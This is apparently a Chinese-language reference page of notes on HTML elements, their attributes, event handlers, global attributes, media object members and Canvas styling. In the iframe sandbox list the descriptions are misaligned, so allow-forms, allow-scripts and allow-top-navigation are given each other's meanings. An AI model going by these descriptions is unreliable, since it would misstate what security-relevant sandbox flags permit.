<ul>
<li>autofocus：规定当页面加载时，文本区域自动获得焦点。</li>
<li>disabled：禁用文本区域。</li>
<li>form：form_id</li>
<li>name</li>
<li>value：按钮初试值</li>
<li>type：类型<ul>
<li>button</li>
<li>reset</li>
<li>submit</li>
</ul>
</li>
<li>form：form_id，规定元素所属的一个或多个表单。</li>
<li>formaction：URL，属性规定当表单提交时处理输入控件的文件的 URL。(只针对 type&#x3D;”submit” 和 type&#x3D;”image”)</li>
<li>formenctype：属性规定当表单数据提交到服务器时如何编码(只适合 type&#x3D;”submit” 和 type&#x3D;”image”)。<ul>
<li>application&#x2F;x-www-form-urlencoded </li>
<li>multipart&#x2F;form-data </li>
<li>text&#x2F;plain</li>
</ul>
</li>
<li>formmethod：定义发送表单数据到 action URL 的 HTTP 方法。 (只适合 type&#x3D;”submit” 和 type&#x3D;”image”)</li>
<li>formnovalidate：覆盖form元素的 novalidate 属性。</li>
<li>formtarget：规定表示提交表单后在哪里显示接收到响应的名称或关键词。(只适合 type&#x3D;”submit” 和 type&#x3D;”image”)<ul>
<li>_blank </li>
<li>_self </li>
<li>_parent </li>
<li>_top </li>
<li>framename</li>
</ul>
</li>
</ul>
<p>select：用来创建下拉列表</p>
<ul>
<li>autofocus：规定当页面加载时，文本区域自动获得焦点。</li>
<li>disabled：禁用文本区域。</li>
<li>form：form_id</li>
<li>name</li>
<li>required</li>
<li>size：下拉列表中的可见数目</li>
<li>multiple：为true时，可以多选</li>
</ul>
<p>optgroup：用于把相关的选项组合在一起</p>
<ul>
<li>disabled：禁用</li>
<li>label：描述</li>
</ul>
<p>option：定义下拉列表中的一个选项（一个条目）。作为select，optgroup，datalist的元素使用</p>
<ul>
<li>disabled：禁用文本区域。</li>
<li>selected：被选中</li>
<li>value：送往服务器的值</li>
<li>label使用optgroup时的标注</li>
</ul>
<p>fieldset：将表单内的相关元素分组。</p>
<ul>
<li>disabled：禁用文本区域。</li>
<li>name</li>
<li>form</li>
</ul>
<p>legend：为fieldset元素定义标题。</p>
<p>datalist：规定了 input 元素可能的选项列表。使用 input 元素的 list 属性来绑定 datalist 元素。</p>
<p>output：作为计算结果输出显示</p>
<ul>
<li>for：描述计算中使用的元素与计算结果之间的关系。</li>
<li>form</li>
<li>name</li>
</ul>
<h1 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h1><p>iframe：规定一个内联框架。</p>
<ul>
<li>height：高度</li>
<li>width：宽度</li>
<li>src：URL，显示的文档</li>
<li>name</li>
<li>seamless：规定 iframe 看起来像是父文档中的一部分。</li>
<li>srcdoc：HTML_code，规定页面中的 HTML 内容显示在 iframe 中。</li>
<li>sandbox：定义一系列额外的限制。<ul>
<li>“”：启用所有限制条件</li>
<li>allow-forms：允许将内容作为普通来源对待。</li>
<li>allow-same-origin：嵌入的页面的上下文可以导航（加载）内容到顶级的浏览上下文环境</li>
<li>allow-scripts：允许表单提交。</li>
<li>allow-top-navigation：允许脚本执行。</li>
</ul>
</li>
</ul>
<h1 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h1><p>img：插入一个图像</p>
<ul>
<li>alt：代替文本</li>
<li>src：URL，图像链接</li>
<li>width：宽度</li>
<li>height：高度</li>
<li>crossorigin：图像的跨域属性<ul>
<li>anonymous</li>
<li>use-credentials</li>
</ul>
</li>
<li>ismap：将图像规定为服务器端图像映射</li>
<li>usemap：mapname，将图像定义为客户器端图像映射。</li>
</ul>
<p>map：用于客户端图像映射。图像映射指带有可点击区域的一幅图像。</p>
<ul>
<li>name：为 image-map 规定的名称。</li>
</ul>
<p>area：定义图像映射内部的区域</p>
<ul>
<li>alt：替代文本</li>
<li>coords：规定区域的坐标。</li>
<li>shape：形状<ul>
<li>default：全部区域</li>
<li>rect：矩形</li>
<li>circle：圆形</li>
<li>poly：多边形</li>
</ul>
</li>
<li>type：MIME_type，规定目标 URL 的 MIME 类型。</li>
<li>media：规定目标 URL 是为何种媒介&#x2F;设备优化的。默认：all。</li>
<li>href：URL</li>
<li>hreflang：language_code</li>
<li>target：打开目标 URL<ul>
<li>_blank</li>
<li>_parent</li>
<li>_self</li>
<li>_top</li>
<li>framename</li>
</ul>
</li>
<li>rel：规定当前文档与目标 URL 之间的关系。<ul>
<li>alternate：文档的替代版本（比如打印页、翻译或镜像）。</li>
<li>author：链接到文档的作者。</li>
<li>bookmark：用于书签的永久网址</li>
<li>help：链接到帮助文档</li>
<li>license：链接到文档的版权信息。</li>
<li>next：选项中的下一个文档</li>
<li>nofollow：是一个HTML标签的属性值。这个标签的意义是告诉搜索引擎”不要追踪此网页上的链接”或”不要追踪此特定链接。</li>
<li>noreferrer：如果用户点击链接指定浏览不要发送 HTTP referer 头部信息。</li>
<li>prefetch：指定的目标文件应该被缓存</li>
<li>prev：选项中的前一个文档</li>
<li>search：文档链接到搜索工具</li>
<li>tag：当前文档的标签(关键词)</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;planets.gif&quot;</span> <span class="attr">width</span>=<span class="string">&quot;145&quot;</span> <span class="attr">height</span>=<span class="string">&quot;126&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Planets&quot;</span> <span class="attr">usemap</span>=<span class="string">&quot;#planetmap&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">map</span> <span class="attr">name</span>=<span class="string">&quot;planetmap&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;rect&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;0,0,82,126&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Sun&quot;</span> <span class="attr">href</span>=<span class="string">&quot;sun.htm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;circle&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;90,58,3&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Mercury&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mercur.htm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;circle&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;124,58,8&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Venus&quot;</span> <span class="attr">href</span>=<span class="string">&quot;venus.htm&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>canvas：通过脚本（通常是 JavaScript）来绘制图形</p>
<ul>
<li>height</li>
<li>width</li>
</ul>
<p>figcaption：为 figure 元素定义标题。</p>
<p>figure：规定独立的流内容（图像、图表、照片、代码等等）。元素的内容应该与主内容相关，同时元素的位置相对于主内容是独立的。</p>
<p>audio：定义声音，比如音乐或其他音频流。</p>
<ul>
<li>autoplay：音频在就绪后马上播放</li>
<li>controls：向用户显示音频控件</li>
<li>loop：每当音频结束时重新开始播放</li>
<li>muted：音频输出为静音</li>
<li>src：音频文件的 URL</li>
<li>preload：音频是否默认被加载以及如何被加载<ul>
<li>auto：页面加载后载入整个音频</li>
<li>metadata：页面加载后只载入元数据</li>
<li>none：页面加载后不载入音频</li>
</ul>
</li>
</ul>
<p>source：为媒体元素（比如 video 和 audio）定义媒体资源</p>
<ul>
<li>media：media_query，媒体资源的类型，供浏览器决定是否下载</li>
<li>src：URL</li>
<li>type：MIME_type，媒体资源的 MIME 类型</li>
</ul>
<p>track：为媒体元素（比如 audio and video）规定外部文本轨道，这个元素用于规定字幕文件或其他包含文本的文件，当媒体播放时，这些文件是可见的。</p>
<ul>
<li>default：该轨道是默认的</li>
<li>label：文本轨道的标签和标题</li>
<li>src：URL</li>
<li>srclang：language_code，轨道文本数据的语言</li>
<li>kind：文本轨道的文本类型<ul>
<li>captions：该轨道定义将在播放器中显示的简短说明。</li>
<li>chapters：该轨道定义章节，用于导航媒介资源。</li>
<li>descriptions：该轨道定义描述，用于通过音频描述媒介的内容，假如内容不可播放或不可见。</li>
<li>metadata：该轨道定义脚本使用的内容。</li>
<li>subtitles：该轨道定义字幕，用于在视频中显示字幕。</li>
</ul>
</li>
</ul>
<p>video：义视频，比如电影片段或其他视频流，支持三种视频格式：MP4、WebM、Ogg。</p>
<ul>
<li>autoplay：音频在就绪后马上播放</li>
<li>controls：向用户显示音频控件</li>
<li>loop：每当音频结束时重新开始播放</li>
<li>muted：音频输出为静音</li>
<li>height：高度</li>
<li>width：宽度</li>
<li>poster：URL，规定视频正在下载时显示的图像，直到用户点击播放按钮。</li>
<li>src：音频文件的 URL</li>
<li>preload：音频是否默认被加载以及如何被加载<ul>
<li>auto：页面加载后载入整个音频</li>
<li>metadata：页面加载后只载入元数据</li>
<li>none：页面加载后不载入音频</li>
</ul>
</li>
</ul>
<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>nav：定义导航链接的部分，内部使用a标签</p>
<p>main：用于指定文档的主体内容，至多使用一次</p>
<p>a：超链接</p>
<ul>
<li>href：URL</li>
<li>hreflang：language_code</li>
<li>media：media_query，规定目标 URL 的媒介类型。</li>
<li>download：filename，指定下载链接</li>
<li>type：MIME_type，规定目标 URL 的 MIME 类型。</li>
<li>target：在何处打开URL<ul>
<li>_blank</li>
<li>_parent</li>
<li>_self</li>
<li>_top</li>
<li>framename</li>
</ul>
</li>
<li>rel：规定当前文档与目标 URL 之间的关系。<ul>
<li>alternate：文档的替代版本（比如打印页、翻译或镜像）。</li>
<li>author：链接到文档的作者。</li>
<li>bookmark：用于书签的永久网址</li>
<li>help：链接到帮助文档</li>
<li>license：链接到文档的版权信息。</li>
<li>next：选项中的下一个文档</li>
<li>nofollow：是一个HTML标签的属性值。这个标签的意义是告诉搜索引擎”不要追踪此网页上的链接”或”不要追踪此特定链接。</li>
<li>noreferrer：如果用户点击链接指定浏览不要发送 HTTP referer 头部信息。</li>
<li>prefetch：指定的目标文件应该被缓存</li>
<li>prev：选项中的前一个文档</li>
<li>search：文档链接到搜索工具</li>
<li>tag：当前文档的标签(关键词)</li>
</ul>
</li>
</ul>
<p>link：定义文档与外部资源的关系，link 元素是空元素，它仅包含属性，只能存在于 head 部分。</p>
<ul>
<li>href</li>
<li>hreflang</li>
<li>media：media_query，规定被链接文档将显示在什么设备上。</li>
<li>sizes：定义了链接属性大小，只对属性 rel&#x3D;”icon” 起作用。</li>
<li>type：MIME_type</li>
<li>rel：规定当前文档与目标 URL 之间的关系。<ul>
<li>alternate：文档的替代版本（比如打印页、翻译或镜像）。</li>
<li>author：链接到文档的作者。</li>
<li>bookmark：用于书签的永久网址</li>
<li>help：链接到帮助文档</li>
<li>license：链接到文档的版权信息。</li>
<li>next：选项中的下一个文档</li>
<li>nofollow：是一个HTML标签的属性值。这个标签的意义是告诉搜索引擎”不要追踪此网页上的链接”或”不要追踪此特定链接。</li>
<li>noreferrer：如果用户点击链接指定浏览不要发送 HTTP referer 头部信息。</li>
<li>prefetch：指定的目标文件应该被缓存</li>
<li>prev：选项中的前一个文档</li>
<li>search：文档链接到搜索工具</li>
<li>tag：当前文档的标签(关键词)</li>
</ul>
</li>
</ul>
<h1 id="元信息"><a href="#元信息" class="headerlink" title="元信息"></a>元信息</h1><p>head可以包含的标签</p>
<ul>
<li>title</li>
<li>style</li>
<li>base</li>
<li>link</li>
<li>meta</li>
<li>script</li>
<li>noscript</li>
</ul>
<p>meta：提供了 HTML 文档的元数据。元数据不会显示在客户端，但是会被浏览器解析。通常用于指定网页的描述，关键词，文件的最后修改时间，作者及其他元数据。元数据通常以 名称&#x2F;值 对出现。如果没有提供 name 属性，那么名称&#x2F;值对中的名称会采用 http-equiv 属性的值。</p>
<ul>
<li>charset：character_set</li>
<li>content：定义与 http-equiv 或 name 属性相关的元信息。</li>
<li>http-equiv：把 content 属性关联到一个名称。<ul>
<li>content-type：规定文档的字符编码。</li>
<li>default-style：规定要使用的预定义的样式表。</li>
<li>refresh：定义文档自动刷新的时间间隔。</li>
</ul>
</li>
<li>name：<ul>
<li>application-name：规定页面所代表的 Web 应用程序的名称。</li>
<li>author：规定文档的作者的名字。</li>
<li>description：规定页面的描述。搜索引擎会把这个描述显示在搜索结果中。</li>
<li>generator：规定用于生成文档的一个软件包（不用于手写页面）。</li>
<li>keywords：规定一个逗号分隔的关键词列表 - 相关的网页</li>
<li>viewport：<ul>
<li>width：设置layout viewport  的宽度，为一个正整数，或字符串”width-device”</li>
<li>initial-scale：设置页面的初始缩放值，为一个数字，可以带小数</li>
<li>minimum-scale：允许用户的最小缩放值，为一个数字，可以带小数</li>
<li>maximum-scale：允许用户的最大缩放值，为一个数字，可以带小数</li>
<li>height：设置layout viewport  的高度，这个属性对我们并不重要，很少使用</li>
<li>user-scalable：是否允许用户进行缩放，值为 “no” 或 “yes”, no 代表不允许，yes 代表允许</li>
</ul>
</li>
<li>HandheldFriendly：true，针对手持设备优化，主要是针对一些老的不识别viewport的浏览器</li>
<li>MobileOptimized：320，微软的老式浏览器</li>
<li>screen-orientation：portrait，uc强制竖屏</li>
<li>x5-orientation：portrait，QQ强制竖屏</li>
<li>full-screen：yes，UC强制全屏</li>
<li>x5-fullscreen：true，QQ强制全屏</li>
<li>browsermode：application，UC应用模式</li>
<li>x5-page-mode：app，QQ应用模式</li>
</ul>
</li>
</ul>
<p>base：</p>
<ul>
<li>href：为页面上的所有的相对链接规定默认 URL 或默认目标。</li>
<li>target：页面中所有的超链接和表单在何处打开。</li>
</ul>
<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>ul：定义无序列表</p>
<p>ol：定义了一个有序列表，列表排序以数字来显示</p>
<ul>
<li>reversed：倒序</li>
<li>type：1&#x2F;A&#x2F;a&#x2F;I&#x2F;i，规定列表的类型。</li>
</ul>
<p>li：定义列表项目，用于ul，ol中。</p>
<ul>
<li>value：规定列表项目的数字</li>
</ul>
<p>dl：定义一个描述列表，与dt，dd一起使用。</p>
<p>dt：定义一个描述列表的项目&#x2F;名字</p>
<p>dd：对一个描述列表中的项目&#x2F;名字进行描述</p>
<h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><p>table：表格</p>
<ul>
<li>border：1&#x2F;0，是否有边框</li>
</ul>
<p>caption：定义表格的标题</p>
<p>thead：标签用于组合 HTML 表格的表头内容，内部必须包含一个或者多个 tr 标签。</p>
<p>tbody：规定表格的各个部分</p>
<p>tfoot：用于组合 HTML 表格的页脚内容</p>
<p>th：定义 HTML 表格中的表头单元格</p>
<ul>
<li>colspan：跨列</li>
<li>headers：header_id，规定与表头单元格相关联的一个或多个表头单元格。</li>
<li>rowspan：跨行</li>
<li>scope：规定表头单元格是否是行、列、行组或列组的头部<ul>
<li>col：规定单元格是列的表头。</li>
<li>colgroup：规定单元格是列组的表头。</li>
<li>row：规定单元格是行的表头。</li>
<li>rowgroup：规定单元格是行组的表头。</li>
</ul>
</li>
</ul>
<p>tr：定义 HTML 表格中的行</p>
<p>td：标准单元格</p>
<ul>
<li>colspan：跨列</li>
<li>headers：header_id，规定与表头单元格相关联的一个或多个表头单元格。</li>
<li>rowspan：跨行</li>
</ul>
<p>col：规定了 colgroup 元素内部的每一列的列属性。</p>
<ul>
<li>span：跨列</li>
</ul>
<p>colgroup：用于对表格中的列进行组合，以便对其进行格式化</p>
<ul>
<li>span：跨列</li>
</ul>
<h1 id="节"><a href="#节" class="headerlink" title="节"></a>节</h1><p>summary：定义一个可见的标题。只有 Chrome 和 Safari 6 支持</p>
<p>dialog：定义一个对话框、确认框或窗口。</p>
<ul>
<li>open：规定 dialog 元素是有效的，用户可以与它进行交互。</li>
</ul>
<p>details：标签规定了用户可见的或者隐藏的需求的补充细节。标签用来供用户开启关闭的交互式控件。元素的内容对用户是不可见的，除非设置了 open 属性。只有 Chrome 和 Safari 6 支持</p>
<ul>
<li>open：规定 details 是否可见。</li>
</ul>
<p>aside：可用作文章的侧栏。定义 article 标签外的内容。</p>
<p>article：定义独立的内容</p>
<p>section：定义了文档的某个区域。比如章节、头部、底部或者文档的其他区域。</p>
<p>footer：定义文档或者文档的一部分区域的页脚。在典型情况下，该元素会包含文档创作者的姓名、文档的版权信息、使用条款的链接、联系信息等等。在一个文档中，您可以定义多个 footer 元素。</p>
<p>header：定义文档或者文档的一部分区域的页眉，应该作为介绍内容或者导航链接栏的容器。</p>
<p>style：定义 HTML 文档的样式信息。</p>
<ul>
<li>media：media_query，为样式表规定不同的媒体类型。</li>
<li>scoped：如果使用该属性，则样式仅仅应用到 style 元素的父元素及其子元素。</li>
<li>type：text&#x2F;css，规定样式表的 MIME 类型。</li>
</ul>
<p>div：元素经常与 CSS 一起使用，用来布局网页。默认情况下，浏览器通常会在 div 元素前后放置一个换行符。</p>
<p>span：用于对文档中的行内元素进行组合。</p>
<h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p>script：用于定义客户端脚本</p>
<ul>
<li>async：异步执行脚本（仅适用于外部脚本）。</li>
<li>charset：在脚本中使用的字符编码（仅适用于外部脚本）。</li>
<li>defer：当页面已完成解析后，执行脚本（仅适用于外部脚本）。</li>
<li>src：URL，外部脚本</li>
<li>type：MIME-type<ul>
<li>text&#x2F;javascript （默认）</li>
<li>text&#x2F;ecmascript</li>
<li>application&#x2F;ecmascript</li>
<li>application&#x2F;javascript</li>
<li>text&#x2F;vbscript</li>
</ul>
</li>
</ul>
<p>noscript：text，用来定义在脚本未被执行时的替代内容</p>
<p>embed：定义了一个容器，用来嵌入外部应用或者互动程序（插件）。</p>
<ul>
<li>height</li>
<li>width</li>
<li>src：URL，嵌入的内容</li>
<li>type：MIME_type</li>
</ul>
<p>object：定义嵌入的对象。</p>
<ul>
<li>form</li>
<li>height</li>
<li>width</li>
<li>name</li>
<li>usemap：mapname，规定与对象一同使用的客户端图像映射的名称。</li>
<li>type：MIME_type</li>
</ul>
<p>param：此标签可为包含它的 object 标签提供参数。</p>
<ul>
<li>name</li>
<li>value</li>
</ul>
<h2 id="事件属性"><a href="#事件属性" class="headerlink" title="事件属性"></a>事件属性</h2><h3 id="窗口事件"><a href="#窗口事件" class="headerlink" title="窗口事件"></a>窗口事件</h3><p>onafterprint：在打印文档之后运行脚本</p>
<p>onbeforeonload：在文档加载之前运行脚本</p>
<p>onblur：当窗口失去焦点时运行脚本</p>
<p>onfocus：当窗口获得焦点时运行脚本</p>
<p>onload：当文档加载时运行脚本</p>
<p>onhaschange：当文档改变时运行脚本</p>
<p>onoffline：当文档离线时运行脚本</p>
<p>ononline：当文档上线时运行脚本</p>
<p>onunload：当用户离开文档时运行脚本</p>
<p>onmessage：当触发消息时运行脚本</p>
<p>onpagehide：当窗口隐藏时运行脚本</p>
<p>onpageshow：当窗口可见时运行脚本</p>
<p>onpopstate:当窗口历史记录改变时运行脚本</p>
<p>onundo：当文档执行撤销时运行脚本</p>
<p>onredo：当文档执行再执行操作（redo）时运行脚本</p>
<p>onresize：当调整窗口大小时运行脚本</p>
<p>onstorage：当 Web Storage 区域更新时（存储空间中的数据发生变化时）运行脚本</p>
<p>onerror：当错误发生时运行脚本</p>
<h3 id="表单事件"><a href="#表单事件" class="headerlink" title="表单事件"></a>表单事件</h3><p>onfocus：当元素获得焦点时运行脚本</p>
<p>onblur：当元素失去焦点时运行脚本</p>
<p>onchange：当元素改变时运行脚本</p>
<p>oninput：当元素获得用户输入时运行脚本</p>
<p>oninvalid：当元素无效时运行脚本</p>
<p>onselect：当选取元素时运行脚本</p>
<p>onsubmit：当提交表单时运行脚本</p>
<p>onformchange：当表单改变时运行脚本</p>
<p>onforminput：当表单获得用户输入时运行脚本</p>
<p>oncontextmenu：当触发上下文菜单时运行脚本</p>
<h3 id="键盘属性"><a href="#键盘属性" class="headerlink" title="键盘属性"></a>键盘属性</h3><p>onkeydown：当按下按键时运行脚本</p>
<p>onkeypress：当按下并松开按键时运行脚本</p>
<p>onkeyup：当松开按键时运行脚本</p>
<h3 id="鼠标事件"><a href="#鼠标事件" class="headerlink" title="鼠标事件"></a>鼠标事件</h3><p>onclick：当单击鼠标时运行脚本</p>
<p>ondblclick：当双击鼠标时运行脚本</p>
<p>ondrag：当拖动元素时运行脚本</p>
<p>ondragend：当拖动操作结束时运行脚本</p>
<p>ondragenter：当元素被拖动至有效的拖放目标时运行脚本</p>
<p>ondragleave：当元素离开有效拖放目标时运行脚本</p>
<p>ondragover：当元素被拖动至有效拖放目标上方时运行脚本</p>
<p>ondragstart：当拖动操作开始时运行脚本</p>
<p>ondrop：当被拖动元素正在被拖放时运行脚本</p>
<p>onmousedown：当按下鼠标按钮时运行脚本</p>
<p>onmousemove：当鼠标指针移动时运行脚本</p>
<p>onmouseout：当鼠标指针移出元素时运行脚本</p>
<p>onmouseover：当鼠标指针移至元素之上时运行脚本</p>
<p>onmouseup：当松开鼠标按钮时运行脚本</p>
<p>onmousewheel：当转动鼠标滚轮时运行脚本</p>
<p>onscroll：当滚动元素的滚动条时运行脚本</p>
<h3 id="多媒体事件"><a href="#多媒体事件" class="headerlink" title="多媒体事件"></a>多媒体事件</h3><p>onabort：当发生中止事件时运行脚本</p>
<p>oncanplay：当媒介能够开始播放但可能因缓冲而需要停止时运行脚本</p>
<p>oncanplaythrough：当媒介能够无需因缓冲而停止即可播放至结尾时运行脚本</p>
<p>ondurationchange：当媒介长度改变时运行脚本</p>
<p>onemptied：当媒介资源元素突然为空时（网络错误、加载错误等）运行脚本</p>
<p>onended：当媒介已抵达结尾时运行脚本</p>
<p>onerror：当在元素加载期间发生错误时运行脚本</p>
<p>onloadeddata：当加载媒介数据时运行脚本</p>
<p>onloadedmetadata：当媒介元素的持续时间以及其他媒介数据已加载时运行脚本</p>
<p>onloadstart：当浏览器开始加载媒介数据时运行脚本</p>
<p>onpause：当媒介数据暂停时运行脚本</p>
<p>onplay：当媒介数据将要开始播放时运行脚本</p>
<p>onplaying：当媒介数据已开始播放时运行脚本</p>
<p>onprogress：当浏览器正在取媒介数据时运行脚本</p>
<p>onratechange：当媒介数据的播放速率改变时运行脚本</p>
<p>onreadystatechange：当就绪状态（ready-state）改变时运行脚本</p>
<p>onseeked：当媒介元素的定位属性不再为真且定位已结束时运行脚本</p>
<p>onseeking：当媒介元素的定位属性为真且定位已开始时运行脚本</p>
<p>onstalled：当取回媒介数据过程中（延迟）存在错误时运行脚本</p>
<p>onsuspend：当浏览器已在取媒介数据但在取回整个媒介文件之前停止时运行脚本</p>
<p>ontimeupdate：当媒介改变其播放位置时运行脚本</p>
<p>onvolumechange：当媒介改变音量亦或当音量被设置为静音时运行脚本</p>
<p>onwaiting：当媒介已停止播放但打算继续播放时运行脚本</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>ontoggle：在用户打开或关闭 details 元素时触发。</p>
<h2 id="全局属性"><a href="#全局属性" class="headerlink" title="全局属性"></a>全局属性</h2><p>accesskey：设置访问元素的键盘快捷键。使用：Alt + ch</p>
<p>class：规定元素的类名（classname）</p>
<p>contenteditable：true&#x2F;false，规定是否可编辑元素的内容。</p>
<p>data-*：用于存储页面的自定义数据</p>
<p>dir：ltr&#x2F;rtl&#x2F;auto，设置元素中内容的文本方向。</p>
<p>draggable：true&#x2F;false&#x2F;auto，指定某个元素是否可以拖动</p>
<p>hidden：hidden 属性规定对元素进行隐藏。</p>
<p>id：规定元素的唯一 id</p>
<p>lang：设置元素中内容的语言代码。</p>
<p>spellcheck：检测元素是否拼写错误</p>
<p>style：规定元素的行内样式（inline style）</p>
<p>tabindex：设置元素的 Tab 键控制次序。</p>
<p>title：规定元素的额外信息（可在工具提示中显示）</p>
<h2 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h2><p>Application</p>
<p>Audio</p>
<p>Video</p>
<p>Image</p>
<p>Text</p>
<p>Multipart</p>
<p>Model</p>
<p>Message</p>
<p>Font</p>
<p><a href="https://www.iana.org/assignments/media-types/media-types.xhtml">MIME 参考</a></p>
<h1 id="Audio-Vidio-对象"><a href="#Audio-Vidio-对象" class="headerlink" title="Audio&#x2F;Vidio 对象"></a>Audio&#x2F;Vidio 对象</h1><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>canPlayType()：检测浏览器是否能播放指定的音频&#x2F;视频类型。<br>load()：重新加载音频&#x2F;视频元素。<br>play()：开始播放音频&#x2F;视频。<br>pause()：暂停当前播放的音频&#x2F;视频。</p>
<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>audioTracks：返回表示可用音频轨道的 AudioTrackList 对象。<br>autoplay：设置或返回是否在加载完成后随即播放音频&#x2F;视频。<br>buffered：返回表示音频&#x2F;视频已缓冲部分的 TimeRanges 对象。<br>controller：返回表示音频&#x2F;视频当前媒体控制器的 MediaController 对象。<br>controls：设置或返回音频&#x2F;视频是否显示控件（比如播放&#x2F;暂停等）。<br>crossOrigin：设置或返回音频&#x2F;视频的 CORS 设置。<br>currentSrc：返回当前音频&#x2F;视频的 URL。<br>currentTime：设置或返回音频&#x2F;视频中的当前播放位置（以秒计）。<br>defaultMuted：设置或返回音频&#x2F;视频默认是否静音。<br>defaultPlaybackRate：设置或返回音频&#x2F;视频的默认播放速度。<br>duration：返回当前音频&#x2F;视频的长度（以秒计）。<br>ended：返回音频&#x2F;视频的播放是否已结束。<br>error：返回表示音频&#x2F;视频错误状态的 MediaError 对象。<br>loop：设置或返回音频&#x2F;视频是否应在结束时重新播放。<br>mediaGroup：设置或返回音频&#x2F;视频所属的组合（用于连接多个音频&#x2F;视频元素）。<br>muted：设置或返回音频&#x2F;视频是否静音。<br>networkState：返回音频&#x2F;视频的当前网络状态。<br>paused：设置或返回音频&#x2F;视频是否暂停。<br>playbackRate：设置或返回音频&#x2F;视频播放的速度。<br>played：返回表示音频&#x2F;视频已播放部分的 TimeRanges 对象。<br>preload：设置或返回音频&#x2F;视频是否应该在页面加载后进行加载。<br>readyState：返回音频&#x2F;视频当前的就绪状态。<br>seekable：返回表示音频&#x2F;视频可寻址部分的 TimeRanges 对象。<br>seeking：返回用户是否正在音频&#x2F;视频中进行查找。<br>src：设置或返回音频&#x2F;视频元素的当前来源。<br>startDate：返回表示当前时间偏移的 Date 对象。<br>textTracks：返回表示可用文本轨道的 TextTrackList 对象。<br>videoTracks：返回表示可用视频轨道的 VideoTrackList 对象。<br>volume：设置或返回音频&#x2F;视频的音量。</p>
<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>abort：当音频&#x2F;视频的加载已放弃时触发。<br>canplay：当浏览器可以开始播放音频&#x2F;视频时触发。<br>canplaythrough：当浏览器可在不因缓冲而停顿的情况下进行播放时触发。<br>durationchange：当音频&#x2F;视频的时长已更改时触发。<br>emptied：当目前的播放列表为空时触发。<br>ended：当目前的播放列表已结束时触发。<br>error：当在音频&#x2F;视频加载期间发生错误时触发。<br>loadeddata：当浏览器已加载音频&#x2F;视频的当前帧时触发。<br>loadedmetadata：当浏览器已加载音频&#x2F;视频的元数据时触发。<br>loadstart：当浏览器开始查找音频&#x2F;视频时触发。<br>pause：当音频&#x2F;视频已暂停时触发。<br>play：当音频&#x2F;视频已开始或不再暂停时触发。<br>playing：当音频&#x2F;视频在因缓冲而暂停或停止后已就绪时触发。<br>progress：当浏览器正在下载音频&#x2F;视频时触发。<br>ratechange：当音频&#x2F;视频的播放速度已更改时触发。<br>seeked：当用户已移动&#x2F;跳跃到音频&#x2F;视频中的新位置时触发。<br>seeking：当用户开始移动&#x2F;跳跃到音频&#x2F;视频中的新位置时触发。<br>stalled：当浏览器尝试获取媒体数据，但数据不可用时触发。<br>suspend：当浏览器刻意不获取媒体数据时触发。<br>timeupdate：当目前的播放位置已更改时触发。<br>volumechange：当音量已更改时触发。<br>waiting：当视频由于需要缓冲下一帧而停止时触发。</p>
<h1 id="Canvas"><a href="#Canvas" class="headerlink" title="Canvas"></a>Canvas</h1><h2 id="颜色、样式和阴影"><a href="#颜色、样式和阴影" class="headerlink" title="颜色、样式和阴影"></a>颜色、样式和阴影</h2><p>属性：</p>
<p>fillStyle：颜色值&#x2F;gradient&#x2F;pattern，设置或返回用于填充绘画的颜色、渐变或模式。<br>strokeStyle：颜色值&#x2F;gradient&#x2F;pattern，设置或返回用于笔触的颜色、渐变或模式。<br>shadowColor：颜色值，设置或返回用于阴影的颜色。<br>shadowBlur：number，设置或返回用于阴影的模糊级别。<br>shadowOffsetX：number，设置或返回阴影与形状的水平距离。<br>shadowOffsetY：number，设置或返回阴影与形状的垂直距离。</p>
<p>方法：</p>
<p>createLinearGradient(x1, y1, x2, y2)：创建线性渐变（用在画布内容上）。<br>createPattern(image, “repeat&#x2F;repeat-x&#x2F;repeat-y&#x2F;no-repeat”)：在指定的方向上重复指定的元素。<br>createRadialGradient(x0,y0,r0,x1,y1,r1)：创建放射状&#x2F;环形的渐变（用在画布内容上）。<br>addColorStop(stop, color)：介于 0.0 与 1.0 之间的值，表示渐变中开始与结束之间的位置，颜色，规定渐变对象中的颜色和停止位置。</p>
<h2 id="线条样式"><a href="#线条样式" class="headerlink" title="线条样式"></a>线条样式</h2><p>lineCap：butt&#x2F;round&#x2F;square，平直&#x2F;圆形&#x2F;正方形，设置或返回线条的结束端点样式。<br>lineJoin：bevel&#x2F;round&#x2F;miter，斜角&#x2F;圆角&#x2F;尖角，设置或返回两条线相交时，所创建的拐角类型。<br>lineWidth：设置或返回当前的线条宽度。<br>miterLimit：设置或返回最大斜接长度。</p>
